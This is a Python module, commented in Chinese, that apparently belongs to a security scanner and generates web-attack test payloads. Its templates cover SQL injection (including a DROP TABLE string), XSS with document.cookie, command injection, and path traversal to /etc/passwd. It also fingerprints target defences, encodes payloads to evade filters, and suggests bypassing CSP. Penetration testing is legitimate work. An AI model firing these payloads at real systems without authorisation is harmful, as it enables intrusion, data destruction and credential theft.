"""Payload Generator - Payload 生成器

根據漏洞類型和目標環境生成測試 Payload
"""

import base64
from enum import Enum
import logging
from typing import Any
import urllib.parse

logger = logging.getLogger(__name__)


class PayloadEncodingType(str, Enum):
    """有效載荷編碼類型 - 與 aiva_common.enums.EncodingType (字符編碼) 區分"""

    NONE = "none"
    URL = "url"
    BASE64 = "base64"
    HTML = "html"
    UNICODE = "unicode"
    DOUBLE_URL = "double_url"


class PayloadGenerator:
    """Payload 生成器

    根據漏洞類型和目標特徵生成定制化的測試 Payload
    """

    def __init__(self):
        """初始化 Payload 生成器"""
        self.generated_count = 0
        self.payload_templates = self._load_templates()

        logger.info("PayloadGenerator initialized")

    def _load_templates(self) -> dict[str, list[str]]:
        """加載 Payload 模板"""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT {columns}--",
                "'; DROP TABLE {table}--",
                "' AND 1=CONVERT(int, @@version)--",
            ],
            "xss": [
                "<script>alert('{message}')</script>",
                "<img src=x onerror=alert('{message}')>",
                "<svg onload=alert('{message}')>",
                "<iframe src=javascript:alert('{message}')>",
            ],
            "command_injection": [
                "; {command}",
                "| {command}",
                "& {command}",
                "`{command}`",
                "$({command})",
            ],
            "path_traversal": [
                "../../../{file}",
                "..\\..\\..\\{file}",
                "....//....//....//",
                "{file}%00",
            ],
        }

    def generate_with_target_analysis(
        self,
        vuln_type: str,
        target_info: dict[str, Any],
        encoding: PayloadEncodingType = PayloadEncodingType.NONE,
        feedback_data: dict[str, Any] | None = None,
        custom_params: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """根據目標環境分析生成Payload
        
        按照業務流程圖：分析目標環境 -> 選擇模板 -> 客製化 -> 驗證 -> 輸出
        
        Args:
            vuln_type: 漏洞類型
            target_info: 目標系統信息
            encoding: 編碼類型
            feedback_data: 執行回饋數據（用於改進）
            custom_params: 自定義參數
            
        Returns:
            生成結果包含：payloads, target_analysis, recommendations
        """
        logger.info(f"開始執行Payload生成流程: {vuln_type}")
        
        # 業務流程步驟1: 分析目標環境 (pg_analyze)
        target_analysis = self._analyze_target_environment(target_info, feedback_data)
        logger.info(f"目標環境分析完成: {target_analysis['environment_type']}")
        
        # 業務流程步驟2: 選擇Payload模板 (pg_select)
        selected_templates = self._select_payload_templates(vuln_type, target_analysis)
        logger.info(f"選擇了 {len(selected_templates)} 個模板")
        
        # 業務流程步驟3: 客製化Payload (pg_customize)
        customized_payloads = self._customize_payloads(
            selected_templates, target_analysis, custom_params
        )
        
        # 業務流程步驟4: 驗證Payload (pg_validate)
        validated_payloads = self._validate_payloads(customized_payloads, target_analysis)
        
        # 業務流程步驟5: 輸出Payload (pg_output)
        final_result = self._format_output(
            validated_payloads, target_analysis, encoding, vuln_type
        )
        
        self.generated_count += len(validated_payloads)
        logger.info(f"Payload生成完成，總數: {len(validated_payloads)}")
        
        return final_result

    def _analyze_target_environment(self, target_info: dict[str, Any], feedback_data: dict[str, Any] | None = None) -> dict[str, Any]:
        """分析目標環境特性"""
        analysis = {
            "environment_type": "unknown",
            "security_mechanisms": [],
            "technology_stack": [],
            "vulnerability_indicators": [],
            "previous_success_patterns": []
        }
        
        # 分析目標系統特性
        if target_info.get("server_header"):
            server = target_info["server_header"].lower()
            if "apache" in server:
                analysis["technology_stack"].append("apache")
            elif "nginx" in server:
                analysis["technology_stack"].append("nginx")
            elif "iis" in server:
                analysis["technology_stack"].append("iis")
                
        # 檢測安全機制
        if target_info.get("security_headers"):
            headers = target_info["security_headers"]
            if "x-xss-protection" in headers:
                analysis["security_mechanisms"].append("xss_protection")
            if "content-security-policy" in headers:
                analysis["security_mechanisms"].append("csp")
            if "x-frame-options" in headers:
                analysis["security_mechanisms"].append("frame_options")
                
        # 利用回饋數據改進分析
        if feedback_data:
            analysis["previous_success_patterns"] = feedback_data.get("successful_payloads", [])
            if feedback_data.get("target_characteristics"):
                analysis["security_mechanisms"].extend(
                    feedback_data["target_characteristics"].get("security_mechanisms", [])
                )
                
        return analysis

    def _select_payload_templates(self, vuln_type: str, target_analysis: dict[str, Any]) -> list[str]:
        """根據目標分析選擇適當模板"""
        base_templates = self.payload_templates.get(vuln_type, [])
        
        # 根據環境特性篩選模板
        filtered_templates = []
        for template in base_templates:
            if self._is_template_suitable(template, target_analysis):
                filtered_templates.append(template)
                
        return filtered_templates or base_templates
        
    def _is_template_suitable(self, template: str, target_analysis: dict[str, Any]) -> bool:
        """檢查模板是否適合目標環境"""
        security_mechanisms = target_analysis.get("security_mechanisms", [])
        
        if "xss_protection" in security_mechanisms and "<script>" in template:
            return False
        if "csp" in security_mechanisms and ("onerror" in template or "onload" in template):
            return False
            
        return True

    def _customize_payloads(self, templates: list[str], target_analysis: dict[str, Any], custom_params: dict[str, Any] | None = None) -> list[str]:
        """客製化Payload模板"""
        params = custom_params or {}
        
        # 根據目標環境調整預設參數
        env_type = target_analysis.get("environment_type", "generic")
        if env_type == "php":
            params.setdefault("message", "document.cookie")
            params.setdefault("file", "/etc/passwd")
        elif env_type == "asp":
            params.setdefault("file", "c:\\windows\\system32\\drivers\\etc\\hosts")
        
        params.setdefault("message", "XSS")
        params.setdefault("command", "whoami")
        params.setdefault("table", "users")
        params.setdefault("columns", "username,password")
        
        customized = []
        for template in templates:
            try:
                customized_payload = template.format(**params)
                customized.append(customized_payload)
            except KeyError as e:
                logger.warning(f"模板參數缺失: {e}")
                
        return customized

    def _validate_payloads(self, payloads: list[str], target_analysis: dict[str, Any]) -> list[str]:
        """驗證Payload有效性"""
        validated = []
        security_mechanisms = target_analysis.get("security_mechanisms", [])
        
        for payload in payloads:
            if self._validate_single_payload(payload, security_mechanisms):
                validated.append(payload)
        return validated
        
    def _validate_single_payload(self, payload: str, security_mechanisms: list[str] | None = None) -> bool:
        """驗證單一Payload"""
        if not payload or len(payload.strip()) == 0:
            return False
        if len(payload) > 10000:
            return False
        
        # 檢查是否與安全機制衝突
        if security_mechanisms:
            if "xss_protection" in security_mechanisms and "<script>" in payload:
                return False
                
        return True

    def _format_output(self, payloads: list[str], target_analysis: dict[str, Any], encoding: PayloadEncodingType, vuln_type: str) -> dict[str, Any]:
        """格式化輸出結果"""
        encoded_payloads = []
        for payload in payloads:
            encoded = self._encode_payload(payload, encoding)
            encoded_payloads.append(encoded)
            
        return {
            "payloads": encoded_payloads,
            "target_analysis": target_analysis,
            "encoding_type": encoding.value,
            "vulnerability_type": vuln_type,
            "generation_metadata": {
                "total_generated": len(encoded_payloads),
                "target_environment": target_analysis.get("environment_type", "unknown")
            }
        }

    def _generate_usage_recommendations(self, target_analysis: dict[str, Any], vuln_type: str) -> list[str]:
        """生成使用建議"""
        recommendations = []
        security_mechanisms = target_analysis.get("security_mechanisms", [])
        
        if "xss_protection" in security_mechanisms:
            recommendations.append("目標啟用了XSS保護，建議使用替代標籤")
        if "csp" in security_mechanisms:
            recommendations.append("目標啟用了CSP，需要繞過Content-Security-Policy")
            
        # 根據漏洞類型提供專用建議
        if vuln_type == "sql_injection":
            recommendations.append("建議測試多種注入技術，Union-based、Boolean-based、Time-based")
        elif vuln_type == "xss":
            recommendations.append("建議測試反射型、存儲型和 DOM-based XSS")
            
        return recommendations

    def generate(
        self,
        vuln_type: str,
        encoding: PayloadEncodingType = PayloadEncodingType.NONE,
        custom_params: dict[str, Any] | None = None,
    ) -> list[str]:

        # 獲取基礎模板
        templates = self.payload_templates.get(vuln_type, [])

        if not templates:
            logger.warning(f"未找到漏洞類型的模板: {vuln_type}")
            return []

        # 替換模板參數
        params = custom_params or {}
        params.setdefault("message", "XSS")
        params.setdefault("command", "whoami")
        params.setdefault("file", "etc/passwd")
        params.setdefault("table", "users")
        params.setdefault("columns", "NULL,NULL,NULL")

        payloads = []
        for template in templates:
            try:
                payload = template.format(**params)

                # 應用編碼
                if encoding != PayloadEncodingType.NONE:
                    payload = self._encode_payload(payload, encoding)

                payloads.append(payload)

            except KeyError as e:
                logger.warning(f"模板參數缺失: {e}, template={template}")
                continue

        self.generated_count += len(payloads)

        logger.info(f"生成了 {len(payloads)} 個 {vuln_type} Payload")

        return payloads

    def _encode_payload(self, payload: str, encoding: PayloadEncodingType) -> str:
        """編碼 Payload"""
        if encoding == PayloadEncodingType.URL:
            return urllib.parse.quote(payload)

        elif encoding == PayloadEncodingType.BASE64:
            return base64.b64encode(payload.encode()).decode()

        elif encoding == PayloadEncodingType.HTML:
            return (
                payload.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("'", "&#x27;")
            )

        elif encoding == PayloadEncodingType.UNICODE:
            return "".join(f"\\u{ord(c):04x}" for c in payload)

        elif encoding == PayloadEncodingType.DOUBLE_URL:
            return urllib.parse.quote(urllib.parse.quote(payload))

        return payload

    def generate_fuzzing_payloads(
        self,
        base_payload: str,
        variations: int = 10,
    ) -> list[str]:
        """生成模糊測試 Payload

        Args:
            base_payload: 基礎 Payload
            variations: 變體數量

        Returns:
            Payload 變體列表
        """
        payloads = [base_payload]

        # 添加長度變化
        payloads.append(base_payload * 2)
        payloads.append(base_payload * 10)
        payloads.append(base_payload * 100)

        # 添加特殊字符
        special_chars = ["%", "#", "&", "?", "=", "+", ";", ":", "@"]
        for char in special_chars[: min(variations, len(special_chars))]:
            payloads.append(base_payload + char)
            payloads.append(char + base_payload)

        return payloads[:variations]

    def get_statistics(self) -> dict[str, Any]:
        """獲取統計信息"""
        return {
            "total_generated": self.generated_count,
            "available_templates": {
                vuln_type: len(templates)
                for vuln_type, templates in self.payload_templates.items()
            },
        }
